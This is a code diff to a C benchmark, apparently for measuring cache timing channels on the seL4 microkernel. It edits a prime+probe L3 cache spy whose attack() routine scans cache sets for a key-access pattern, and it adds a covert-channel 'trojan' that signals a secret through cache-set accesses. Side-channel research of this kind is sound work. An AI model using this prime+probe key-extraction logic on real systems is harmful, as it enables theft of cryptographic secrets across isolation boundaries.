@@ -10,6 +10,9 @@
 #include "cachemap.h"
 #include "pp.h"
 #include "low.h"
+#include "bench_common.h"
+
+
 
 #define SIZE (16*1024*1024)
 
@@ -195,16 +198,13 @@ static int matchcount(const char *record, const char *match, int allowedmisses) 
 static void sample(pp_t pp, char *record, int samplecount) {
   pp_prime(pp, 50);
   uint32_t p = rdtscp();
-  /*a miss in the probing set represented by @, all hit is "."*/
   for (int i = 0; i < samplecount; i++) {
-    //record[i] = pp_probe(pp) ? '@' : '.';
-      record[i] = pp_probe(pp);
+    record[i] = pp_probe(pp) ? '@' : '.';
     do {
     } while (rdtscp() - p < SLOT);
     p = rdtscp();
   }
-  /*return a string represnet the number of samples for that probe*/
-  //record[samplecount] = '\0';
+  record[samplecount] = '\0';
 }
 
 
@@ -212,7 +212,7 @@ static cachemap_t map() {
   for (int i = 0; i < 1024*1024; i++)
     for (int j = 0; j < 1024; j++)
       a *=i+j;
-  printf("%d\n", a);
+ // printf("%d\n", a);
   char *buf = (char *)mmap(NULL, SIZE + 4096 * 2, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
   if (buf == MAP_FAILED) {
     perror("mmap");
@@ -223,7 +223,7 @@ static cachemap_t map() {
   buf_switch &= ~(0xfff); 
   buf_switch += 0x1000; 
   buf = (char *) buf_switch; 
-  printf("buffer %p\n", buf);
+ // printf("buffer %p\n", buf);
 
 
   cachemap_t cm;
@@ -233,7 +233,7 @@ static cachemap_t map() {
     vl_push(candidates, buf + i);
 
   cm = cm_linelist(candidates);
-  printf("Cachemap done: %d sets, %d unloved\n", cm->nsets, vl_len(candidates));
+  //printf("Cachemap done: %d sets, %d unloved\n", cm->nsets, vl_len(candidates));
   //if (cm->nsets != 128 || vl_len(candidates) != 0) 
     //exit (1);
   return cm;
@@ -248,20 +248,12 @@ static void attack(cachemap_t cm) {
   //for (int offset = 0xd00; offset < 0xe00; offset += 64) {
     for (int i = 0; i < cm->nsets; i++)
       pps[i] = pp_prepare(cm->sets[i], L3_ASSOCIATIVITY, offset);
-    //printf("Trying offset 0x%03x\n", offset);
+    printf("Trying offset 0x%03x\n", offset);
     for (int i = 0; i < cm->nsets; i++) {
       sample(pps[i], record, SEARCHLEN);
-
-      /*print out the search record, using to generate heat maps
-       may take 1 hour to run*/
-      for (int z = 0; z < SEARCHLEN; z++)
-          printf("%d ", record[z]);
-      printf("\n");
-#if 0
       //printf("%d[0x%03x] - %.300s\n", i, offset, record);
       int matches = matchcount(record, mask, ALLOWEDMISSES);
       if (matches > SEARCHLEN*2/strlen(mask)/3) {
-          /*matches at the cache set with offset, probing record....*/
 	printf("Match at %d[0x%03x]: %.150s\n", i, offset, record);
 	sample(pps[i], record, RECORDLEN);
 	if (matchcount(record, mask, ALLOWEDMISSES) < SEARCHLEN*2/strlen(mask)/3) {
@@ -294,10 +286,9 @@ static void attack(cachemap_t cm) {
 	parse(start);
         found = 1;
       }
-#endif
     }
   }
-  //printf("Attack completed - %skey found\n", found ? "" : "no ");
+  printf("Attack completed - %skey found\n", found ? "" : "no ");
 }
 #if 0
 /*sandy bridge machine frequency 3.4GHZ*/
@@ -317,29 +308,117 @@ static void mastik_sleep(unsigned int sec) {
 }
 #endif 
 
-int mastik_spy(seL4_CPtr ep, char **av) {
+uint32_t on[1000];
+uint32_t off[1000];
+uint32_t xx[1000];
+
+void measure() {
+  on[0] = 1;
+	off[0] = 1;
+	xx[0] = 1;
+  int count = 0;
+  uint32_t start = rdtscp();
+  uint32_t prev = start;
+  for (int i = 0; i < 100;) {
+    uint32_t cur = rdtscp();
+    if (cur - start > 10000) {
+      xx[i] = start;
+      on[i] = prev;
+      off[i] = cur;
+      prev = cur;
+      i++;
+    }
+    start = cur;
+  }
+ 
+  printf("start prev cur -> on off tot\n");
+  for (int i = 0; i < 100; i++) 
+    printf("%u %u %u -> %u %u %u\n", xx[i], on[i], off[i], xx[i] - on[i], off[i] - xx[i], off[i] - on[i]);
+  exit(0);
+}
+      
+
+
+int l3_kd_trojan(bench_covert_t *env) {
 //  extern unsigned int sleep(unsigned int seconds);
     seL4_Word badge;
     seL4_MessageInfo_t info;
-
+    seL4_CPtr ep = env->r_ep; 
+ 
     info = seL4_Recv(ep, &badge);
     assert(seL4_MessageInfo_get_label(info) == seL4_NoFault);
 
-
+    /*receive the shared address to record the secret*/
+    uint32_t *share_vaddr = (uint32_t *)seL4_GetMR(0);
     cachemap_t cm = map();
 
     info = seL4_MessageInfo_new(seL4_NoFault, 0, 0, 1);
     seL4_SetMR(0, 0); 
     seL4_Send(ep, info);
 
+    uint64_t cur, prev; 
+   
+    /*nprobing sets is 64 (16 colour * 4 cores) on a coloured platform
+     and 128 (32 colour * 4 cores) on a non-coloured platform
+     secret represents the number of cache sets in total, 64 sets in a 
+     page, all together nsets * 64.*/
+    for (int secret = 0; secret < cm->nsets * 64; secret += CONFIG_BENCH_KERNEL_SCHEDULE_STEP) {
+
+        for (int n = 0; n < CONFIG_BENCH_KERNEL_SCHEDULE_RUNS; n++) {
+            /*wait for a new time slice*/ 
+            cur = prev = rdtscp_64(); 
+            while (cur - prev < KERNEL_SCHEDULE_TICK_LENTH) {
+                prev = cur;
+                cur = rdtscp_64();
+            }
+
+            /*update the secret read by low*/ 
+            *share_vaddr = secret; 
+            for (int i = 0; i < secret; i++) {
+                /*16 is the associativity*/
+                vlist_t vl = cm->sets[i >> 6]; 
+                int l = 16; 
+                if (l > vl_len(vl)) 
+                    l = vl_len(vl); 
+
+                /*touch the page*/
+                for (int j = 0; j < l; j++) {
+
+                    char *p = (char *)vl_get(vl, j); 
+                    p[(i & 0x3f) << 6] = 0; 
+                }
+
+            }
+        }
+    }
+    for(;;) {
+     /*never return*/
+
+/*     vlist_t vl = cm->sets[i];
+      int l = 16;
+      if (l > vl_len(vl))
+	l = vl_len(vl);
+      for (int c = 0; c < 4096; c += 128) {
+	for (int j = 0; j < l; j++) {
+	  char *p = (char *)vl_get(vl, j);
+	  p[c] = 0;
+	}
+      }
+      i++;
+      if (i == cm->nsets)
+	i = 0;
+  */      
+    }
+
+
  
   for (;;) {
     /*waiting on msg to start*/
       info = seL4_Recv(ep, &badge);
       assert(seL4_MessageInfo_get_label(info) == seL4_NoFault);
+      measure();
 
-      printf("test start\n");
-      attack(cm);
+//      attack(cm);
 
       info = seL4_MessageInfo_new(seL4_NoFault, 0, 0, 1);
       seL4_SetMR(0, 0); 
